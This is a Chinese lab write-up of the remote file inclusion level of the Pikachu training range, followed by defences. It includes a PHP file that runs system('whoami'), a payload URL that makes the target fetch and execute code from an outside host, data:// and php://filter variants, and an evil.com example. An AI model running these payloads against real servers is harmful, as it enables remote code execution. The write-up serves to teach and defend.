# 文件包含(remote) 通关笔记

> 这关的想法很简单：**把 `filename` 写成一个远程 URL，让服务器去下载并执行我们的 PHP 代码。**
>
> 但现实中它有个硬门槛——**`allow_url_include` 默认是关的。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | File Inclusion → File Inclusion(remote) |
| 页面地址 | `http://pikachu/vul/fileinclude/fi_remote.php` |
| 提交方式 | GET |
| 参数名 | `filename` |
| 目标 | 包含远程服务器上的 PHP 文件并执行 |

## 二、先看环境（这一步很关键）

打开页面，如果 `allow_url_include` 没开，页面顶部会显示红字警告：

```
warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!
```

**我实测的结果：**

| 配置 | 状态 |
| --- | --- |
| `allow_url_include` | **Off**（页面有警告） |
| `allow_url_fopen` | On |

**所以在默认配置下，这一关是打不通的。**

## 四、我的解题步骤

### 步骤 1：准备一个远程文件

在自己电脑上起一个 HTTP 服务，放一个 `shell.txt`：

```php
<?php
echo "RFI_OK";
system('whoami');
?>
```

> 注意：远程文件**不能命名为 `.php`** 也没关系——`include` 不看扩展名，看内容。

启动服务：

```bash
python -m http.server 8000
```

### 步骤 2：构造 payload

```
fi_remote.php?filename=http://你的IP:8000/shell.txt&submit=
```

### 步骤 3：结果

如果配置对了，页面会输出：

```
RFI_OK
yzz\wl
```

**服务器的 PHP 执行了我们远程提供的代码。**

## 五、原理分析

### 5.1 源码

```php
$html1='';
if(!ini_get('allow_url_include')){
    $html1.="<p style='color: red'>warning:你的allow_url_include没有打开...</p>";
}

$html='';
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";//变量传进来直接包含,没做任何的安全限制
}
```

**注意这一关没有 `include/` 前缀**——`filename` 直接作为完整路径。

**所以 `http://...` 才能生效。**

### 5.2 为什么需要 `allow_url_include`

PHP 的 `include` 支持很多 wrapper：

| wrapper | 说明 | 是否受 allow_url_include 限制 |
| --- | --- | --- |
| `file://` | 本地文件 | 否 |
| `http://` | 远程 HTTP | **是** |
| `ftp://` | 远程 FTP | **是** |
| `php://filter` | 过滤器 | 否 |
| `data://` | 数据流 | **是** |
| `phar://` | 归档 | 否 |

`allow_url_include` 默认 **Off**，是 PHP 官方在 5.2 之后改的——**因为这个漏洞太容易 RCE 了。**

### 5.3 为什么远程文件不能是 `.php`

其实可以，但要**远程服务器把 .php 当静态文本返回**。

如果你访问 `http://evil.com/shell.php`，对方服务器会**执行**它并返回 HTML——你的代码就没了。

所以通常：

- 命名为 `.txt`、`.jpg`，让服务器原样返回
- 或者博客/代码托管平台的 raw 链接

**关键在于"返回给 include 的必须是 PHP 源码"。**

## 六、知识点与笔记

### 6.1 RFI 成立的条件

| 条件 | 说明 |
| --- | --- |
| **`allow_url_include = On`** | 硬门槛 |
| **`allow_url_fopen = On`** | 一般默认开 |
| 代码里 `include` 可控 | 这关满足 |
| 没有前缀拼接 | 这关满足（上一关有 `include/` 前缀，所以打不了 RFI） |

### 6.2 为什么这一关没有前缀

对比一下：

| 关卡 | 代码 | 能否 RFI |
| --- | --- | --- |
| local | `include "include/$filename"` | ❌（前缀挡住了） |
| remote | `include "$filename"` | ✅ |

**有无前缀，决定了能不能用 `http://`。**

### 6.3 替代方案：`data://` 和 `php://`

如果 `allow_url_include=On`，还可以：

```
data://text/plain,<?php phpinfo();?>
```

甚至不用远程服务器。

如果没有 `allow_url_include`，可以试：

```
php://filter/convert.base64-decode/resource=data://...
```

**但这些都是"配置允许"的前提下。**

### 6.4 现实中 RFI 为什么少见

| 原因 | 说明 |
| --- | --- |
| `allow_url_include` 默认 Off | 大部分环境不开 |
| 云主机/容器默认配置更严 | |
| WAF 会拦 `http://` | |
| LFI 更常见 | 有前缀也能用 `../` |

**但一旦开了，RFI 就是"直接 RCE"。**

---

## 七、和本地包含的区别

| | local | remote |
| --- | --- | --- |
| 代码 | `include "include/$filename"` | `include "$filename"` |
| 前缀 | 有 | **无** |
| 能否包含远程 | ❌ | ✅ |
| 需要配置 | 不需要 | **`allow_url_include=On`** |
| 默认能打通吗 | **能** | **不能** |
| 危害 | 读文件 / 配合组合拳 | **直接 RCE** |

---

## 八、防御怎么写

### 8.1 保持 `allow_url_include = Off`

```ini
allow_url_include = Off
```

**默认就是这样，别改。**

### 8.2 不要用用户输入拼路径

```php
$allow = ['file1.php', 'file2.php', 'file3.php'];
if (!in_array($filename, $allow, true)) {
    exit('非法文件');
}
include $filename;
```

### 8.3 校验协议

```php
$parts = parse_url($filename);
if (isset($parts['scheme']) && !in_array($parts['scheme'], ['file'], true)) {
    exit('不允许的协议');
}
```

### 8.4 限制目录

```php
$base = realpath(__DIR__ . '/include');
$target = realpath($filename);

if ($target === false || strpos($target, $base) !== 0) {
    exit('非法路径');
}
```

## 九、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 远程文件包含 → 直接 RCE |
| 前提 | `allow_url_include = On` |
| 实测 | **当前环境是 Off，默认打不通** |
| payload | `?filename=http://你的IP/shell.txt` |
| 修复 | 保持 Off + 白名单 |

**一句话**：

> **RFI 是"最爽"的漏洞——不用上传、不用猜路径，直接让服务器执行你的代码。**
> **但也正因为太爽，PHP 把它默认关闭了。**
